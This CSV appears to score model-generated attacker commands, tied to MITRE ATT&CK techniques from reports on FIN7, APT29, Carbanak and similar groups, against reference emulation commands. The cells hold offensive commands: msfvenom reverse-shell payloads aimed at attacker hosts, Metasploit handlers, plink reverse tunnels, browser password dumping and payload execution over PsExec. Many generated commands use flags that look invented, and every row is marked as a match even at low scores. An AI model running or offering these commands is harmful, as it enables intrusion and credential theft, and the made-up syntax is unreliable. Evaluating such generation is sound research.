report,file,tool,input_command,matched_command,chrf_score,match_found
FIREEYE4_FIN7,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
FIREEYE4_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Command:,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"4,758",True
FIREEYE4_FIN7,command_plink_TA0008_T1021.txt,plink,plink.exe -load sessname -X -v -R <vnc_port>:localhost:<vnc_port> <attacker_ssh_user>@<target_host>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","42,943",True
FIREEYE4_FIN7,command_rubeus_TA0009_T1113.txt,rubeus,rubeus logonsession /screenshot,`rubeus.exe kerberoast /domain:oz.local`,"20,723",True
FIREEYE4_FIN7,command_ryuk_TA0004_T1055.txt,ryuk,ryuk.exe /inject <target_process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"36,186",True
FIREEYE4_FIN7,command_ryuk_TA0005_T1055.txt,ryuk,ryuk.exe --inject <process_name>,`ryuk.exe --encrypt --process-name notepad.exe`,"46,374",True
FIREEYE5_FIN7,command_adfind_TA0003_T1546.txt,adfind,"adfind -sc adobjcnt:fsp -base CN=Foreign Security Principals,CN=Schema,CN=Configuration",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"17,117",True
FIREEYE5_FIN7,command_adfind_TA0004_T1546.txt,adfind,"adfind -b CN=Application Shim Database,CN=Schema,CN=Configuration,DC=example,DC=com -ds -showdel",`adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt`,"14,234",True
FIREEYE5_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe -c > shim_database_file.sdb,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","42,096",True
FIREEYE5_FIN7,command_invoke_psimage_TA0002_T1106.txt,invoke psimage,Invoke-PSImage -ScriptBlock {RtlDecompressBuffer} -OutputFile,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"39,425",True
FIREEYE5_FIN7,command_invoke_psimage_TA0003_T1543.txt,invoke psimage,Invoke-PSImage -Script <malicious_payload_script> -Out <new_image_file>.png -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"34,39",True
FIREEYE5_FIN7,command_invoke_psimage_TA0004_T1543.txt,invoke psimage,Invoke-PSImage -Script .\T1543.ps1 -Out .\system-process.ps1 -WebRequest,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"46,78",True
FIREEYE5_FIN7,command_pupy_TA0004_T1055.txt,pupy,gen -f client -O windows -A x64 connect --host <ip>:<port> -t transport,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"58,531",True
FIREEYE5_FIN7,command_pupy_TA0005_T1055.txt,pupy,gen -f dll connect --host <target_ip>:<port> -t <transport>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"27,894",True
FIREEYE6_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FIREEYE6_FIN7,command_invoke_psimage_TA0003_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.exe -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"47,016",True
FIREEYE6_FIN7,command_invoke_psimage_TA0004_T1547.txt,invoke psimage,Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Out .\startup.png -Image .\kiwi.jpg -Startup,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"52,075",True
FIREEYE6_FIN7,command_wmic_TA0007_T1057.txt,wmic,wmic path win32_process get name,"`wmic /node:#{""POS system""} process call create #{""executable""}`","23,52",True
FIREEYE6_FIN7,command_wmic_TA0009_T1018.txt,wmic,"wmic path win32_process get processid, name, executablepath /value","`wmic /node:#{""POS system""} process call create #{""executable""}`","29,713",True
FIREEYE6_FIN7,command_wmic_TA0009_T1082.txt,wmic,wmic process list /output:XML > process_output.xml,"`wmic /node:#{""POS system""} process call create #{""executable""}`","19,744",True
FORCEPOINT_CARBANAK,command_chrome_passwords_TA0011_T1102.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
FORCEPOINT_CARBANAK,command_plink_TA0002_T1071.txt,plink,"plink.exe -load mysession -o ""POST /path/to/web/protocol"" -v","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","20,757",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1071.txt,plink,"plink.exe mysession echo ""GET / HTTP/1.1"" -batch",`plink.exe <domain_admin>@<bankfileserver_ip>`,"20,78",True
FORCEPOINT_CARBANAK,command_plink_TA0011_T1105.txt,plink,plink -batch -ssh ggldr@<google_service_url>,"```sh
plink -ssh #{user}@#{server}
```","20,408",True
FORK_APT29,command_chrome_passwords_TA0009_T1114.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_user_data>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","33,482",True
FORK_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -Embed -InputFile ""<obfuscated_script.png>"" -OutputFile ""<output.png>""",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,258",True
FORK_APT29,command_metasploit_TA0011_T1102.txt,metasploit,msfconsole -r <task_database_file>,`sudo msfconsole`,"29,384",True
FORK_APT29,command_plink_TA0010_T1048.txt,plink,plink.exe -no-sanitise-stdout -ssh <victim_ssh_user>@<victim_ssh_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","32,856",True
FORK_APT29,command_plink_TA0011_T1071.txt,plink,plink.exe -telnet <CnC_Server_IP> -P <port_number>,`plink.exe <domain_admin>@<bankfileserver_ip>`,"27,913",True
FORK_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<CnC_Server_IP> -s -u <username> -v <file_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,434",True
FORK_APT29,command_rubeus_TA0005_T1070.txt,rubeus,rubeus.exe kill,`rubeus.exe kerberoast /domain:oz.local`,"54,411",True
FORK_APT29,command_rubeus_TA0006_T1558.txt,rubeus,rubeus.exe triage,`rubeus.exe kerberoast /domain:oz.local`,"45,516",True
FORTINET_OILRIG,command_ryuk_TA0002_T1105.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,"36,908",True
FORTINET_OILRIG,command_wmic_TA0002_T1047.txt,wmic,wmic /node:<c2_server_ip> /namespace:\\root\cimv2 path Win32_PingResult call Ping,"`wmic /node:#{""POS system""} process call create #{""executable""}`","19,692",True
GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
GIGAMON1_FIN7,command_chrome_passwords_TA0002_T1204.txt,chrome passwords,chrome-passwords.exe -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","68,591",True
GIGAMON1_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,"Invoke-PSImage -ScriptData ""base64:<encoded_script_here>"" -OutputFile <output_image_file>",`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,909",True
GIGAMON2_FIN7,command_adfind_TA0005_T1112.txt,adfind,"adfind -b <domain> -f ""(|(sAMAccountType=805306144)(|msDS-User-Account-Control-Computed:2))"" -dn <target_user>",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"14,977",True
GIGAMON2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
GIGAMON2_FIN7,command_chrome_passwords_TA0009_T1005.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
GIGAMON2_FIN7,command_invoke_psimage_TA0003_T1546.txt,invoke psimage,Invoke-PSImage -Script .\shim.ps1 -Out .\shim.png -Image .\shield.jpg,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"62,994",True
GIGAMON2_FIN7,command_psexec_TA0005_T1620.txt,psexec,"psexec \\target_machine -accepteula -nobanner -l -priority high cmd /c start /b ""path_to_dll"" /a /w","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,8",True
GIGAMON2_FIN7,command_psexec_TA0007_T1057.txt,psexec,psexec \\<target_computer> -u Administrator -p <password> -s cmd /c tasklist,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","17,38",True
GIGAMON3_FIN7,command_plink_TA0011_T1071.txt,plink,plink -sshlog <dns_tunnel_log_file>,"```sh
plink -ssh #{user}@#{server}
```","22,935",True
GIGAMON3_FIN7,command_rubeus_TA0005_T1027.txt,rubeus,rubeus asktgs /ticket:<base64(ticket.kirbi)> /enc:aes256,`rubeus.exe kerberoast /domain:oz.local`,"14,269",True
GRIZZLY_APT29,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,Invoke-PSImage -Script { Get-Content -Path <file_path> -ErrorAction SilentlyContinue },`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"30,351",True
GRIZZLY_APT29,command_psexec_TA0002_T1204.txt,psexec,psexec -l <user_name> <target_system>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","15,552",True
GRIZZLY_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -u <username> -p <password> cmd /c powershell.exe -ExecutionPolicy Bypass -File <ransomware_dll_path>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","24,836",True
InsideTheBreach_FIN6,command_chrome_passwords_TA0000_T1056.txt,chrome passwords,chrome --password-store=sync --dump-passwords <password_file_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","24,189",True
INTEZER_OILRIG,command_chrome_passwords_TA0005_T1027.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
KASPERKY1_FIN7,command_chrome_passwords_TA0009_T1185.txt,chrome passwords,chrome-passwords -p > output.txt,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","46,422",True
KASPERKY1_FIN7,command_metasploit_TA0002_T1203.txt,metasploit,"msfconsole -x ""use exploit/windows/fileformat/ms03_026"" -x ""set payload windows/meterpreter/reverse_tcp"" -x ""set RHOST <target_ip>"" -x ""set RPORT 445"" -x ""exploit""","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","42,009",True
KASPERKY1_FIN7,command_metasploit_TA0011_T1105.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp <initial_downloader Payload> LHOST=<attacker_ip> LPORT=<attacker_port>,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,"51,889",True
KASPERKY2_FIN7,command_adfind_TA0007_T1082.txt,adfind,"adfind -b <domain_name> -f ""(&(objectCategory=Computer)(operatingSystem=*))"" -r",`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,"32,495",True
KASPERKY2_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
KASPERKY2_FIN7,command_invoke_psimage_TA0011_T1105.txt,invoke psimage,Import-Module .\Invoke-PSImage.ps1,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"42,03",True
KASPERKY2_FIN7,command_paexec_TA0007_T1016.txt,paexec,PAExec @computers.txt -u <domain_admin> -p <password> -i -c ipconfig /all," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","38,387",True
KASPERKY2_FIN7,command_pupy_TA0001_T1078.txt,pupy,run loot_memory browser_process_id,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","13,502",True
KASPERKY2_FIN7,command_pupy_TA0003_T1078.txt,pupy,run hashmon /path/to/process/memory,"[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`","13,026",True
KASPERKY2_FIN7,command_pupy_TA0004_T1078.txt,pupy,lazagne windows,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"22,745",True
KASPERKY2_FIN7,command_pupy_TA0005_T1078.txt,pupy,run Lazagne,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","6,349",True
KASPERKY2_FIN7,command_ryuk_TA0003_T1547.txt,ryuk,"ryuk -e --process-name ""GRIFFON"" --drop-bat-files",`ryuk.exe --encrypt --process-name notepad.exe`,"36,507",True
KASPERKY2_FIN7,command_ryuk_TA0004_T1547.txt,ryuk,ryuk.exe --process-name <process_name> -e,`ryuk.exe --encrypt --process-name notepad.exe`,"54,851",True
KASPERKY2_FIN7,command_wmic_TA0002_T1047.txt,wmic,"wmic process call create ""notepad.exe""","`wmic /node:#{""POS system""} process call create #{""executable""}`","51,612",True
KASPERKY3_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
KASPERKY3_FIN7,command_chrome_passwords_TA0011_T1105.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
KASPERKY3_FIN7,command_invoke_psimage_TA0005_T1027.txt,invoke psimage,invoke-psimage -e -i <image_file> -o <output_png>,`Invoke-PSImage -Script .\meterpreter.ps1 -Out .\monkey.png -Image .\monkey.jpg`,"22,833",True
KASPERKY3_FIN7,command_plink_TA0011_T1071.txt,plink,plink.exe -no-sanitise-stdout -batch <attacker_ssh_user>@<dns_server_ip>,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","42,552",True
KASPERSKY1_CARBANAK,command_chrome_passwords_TA0009_T1056.txt,chrome passwords,chrome-passwords -p <file_path_to_chrome_database>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","33,365",True
KASPERSKY2_CARBANAK,command_metasploit_TA0002_T1203.txt,metasploit,msfconsole -r exploit.rb,`sudo msfconsole`,"41,271",True
KASPERSKY2_CARBANAK,command_psexec_TA0001_T1078.txt,psexec,psexec \-u <domain>\user2 \-p <password> -i 0 \\remote_system,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","22,96",True
KASPERSKY2_CARBANAK,command_psexec_TA0005_T1078.txt,psexec,psexec \\remote_system -u Domain\user1 -p <password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,128",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1055.txt,pupy,download C:\\Windows\\System32\\svchost.exe,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","22,053",True
KASPERSKY2_CARBANAK,command_pupy_TA0004_T1134.txt,pupy,privesc_checker -s <os_type> -f <file_path>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"14,076",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1055.txt,pupy,run memory_exec C:\\Windows\\System32\\svchost.exe privilege::debug,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"14,202",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1070.txt,pupy,pupy <file_path> rm -rf,"[pupy] > `download ""C:\Users\<username>\AppData\Roaming\Draft.Zip"" .`","13,455",True
KASPERSKY2_CARBANAK,command_pupy_TA0005_T1134.txt,pupy,getsystem <windows_system_privilege>,`gen -o cod.3aka3.scr -f client -O windows -A x64 connect -t ec4 --host <attacker IP>:1234`,"18,173",True
MAGECART_FIN6,command_chrome_passwords_TA0011_T1056.txt,chrome passwords,chrome-passwords,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","64,495",True
MAGECART_FIN6,command_metasploit_TA0001_T1190.txt,metasploit,msfvenom -p windows/x86/shell_reverse_tcp LHOST=192.168.1.123 LPORT=4444 -e x86/shikata_ga_nai -f exe > payload.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,"38,36",True
MappingMitreToSandwormAPT_SANDWORM,command_chrome_passwords_TA0006_T1552.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","60,523",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0005_T1070.txt,ryuk,ryuk.exe --mount-shares,`ryuk.exe --encrypt --process-name notepad.exe`,"38,671",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0011_T1001.txt,ryuk,ryuk.exe --encrypt,`ryuk.exe --encrypt --process-name notepad.exe`,"72,768",True
MappingMitreToSandwormAPT_SANDWORM,command_ryuk_TA0040_T1490.txt,ryuk,ryuk.exe /delete-backups,`ryuk.exe --encrypt --process-name notepad.exe`,"29,303",True
MappingMitreToSandwormAPT_SANDWORM,command_windows_credential_editor_TA0006_T1003.txt,windows credential editor,wce -w,"```sh
wce.exe -w
```","33,601",True
MAZE_FIN6,command_psexec_TA0003_T1078.txt,psexec,psexec -u <domain_admin_account> -p <password> \\remote_system -s,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","21,071",True
MICROSOFT_APT29,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","59,855",True
MICROSOFT_APT29,command_paexec_TA0011_T1219.txt,paexec,paexec -h -i -c <dll_name>," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `","17,01",True
MICROSOFT_APT29,command_plink_TA0011_T1071.txt,plink,"plink.exe -i ""<private_key_file>"" <attacker_ssh_user>@<server_ip> -R 80:localhost:80","`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,614",True
MICROSOFT_APT29,command_psexec_TA0011_T1105.txt,psexec,psexec \\<target_computer> -s -nobanner -accepteula -c <file_path>\cyzfc.dat,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
`","23,917",True
MoreEggs_FIN6,command_adfind_TA0043_T1589.txt,adfind,adfind -sc whoami,"adfind -f ""(objectcategory=group)""`","29,853",True
MoreEggs_FIN6,command_windows_credential_editor_TA0002_T1059.txt,windows credential editor,wce -l,"```sh
wce.exe -w
```","23,998",True
MORPHISEC_FIN6,command_metasploit_TA0004_T1055.txt,metasploit,msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload,"```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","41,109",True
MORPHISEC_FIN6,command_metasploit_TA0005_T1055.txt,metasploit,"msfpayload windows/shell/reverse_tcp -f powershell -X 32 -c ""encode_final_payload"" -o remove_comspec -p <shellcode>","```
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lport 8080
    set lhost 192.168.0.4
    set ExitOnSession False
    exploit -j
```","28,358",True
MORPHISEC_FIN6,command_metasploit_TA0011_T1219.txt,metasploit,use auxiliary/scanner/telnet/lantronix_telnet_password,"```sh
msf> use auxiliary/admin/smb/psexec_ntdsgrab
```","27,641",True
MORPHISEC_FIN6,command_plink_TA0008_T1021.txt,plink,plink.exe -i key attacker_ssh_user@remote_server -R 22:localhost:22,"`plink.exe -pw ""<attacker_ssh_user_password>"" <attacker_ssh_user>@192.168.0.4 -R 3389:localhost:3389`","50,951",True
MORPHISEC_FIN6,command_rubeus_TA0003_T1547.txt,rubeus,rubeus.exe klist /purge,`rubeus.exe kerberoast /domain:oz.local`,"45,406",True
MORPHISEC_FIN6,command_rubeus_TA0004_T1547.txt,rubeus,rubeus.exe purge /luid:<logon_session_id>,`rubeus.exe kerberoast /domain:oz.local`,"26,94",True
MORPHISEC_FIN6,command_wmic_TA0002_T1047.txt,wmic,"wmic process call ""winmgmt start"" /RECORD:C:\temp\wmi_record.xml","`wmic /node:#{""POS system""} process call create #{""executable""}`","25,596",True
MORPHISEC_FIN7,command_chrome_passwords_TA0002_T1059.txt,chrome passwords,chrome-passwords.exe,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`","72,548",True
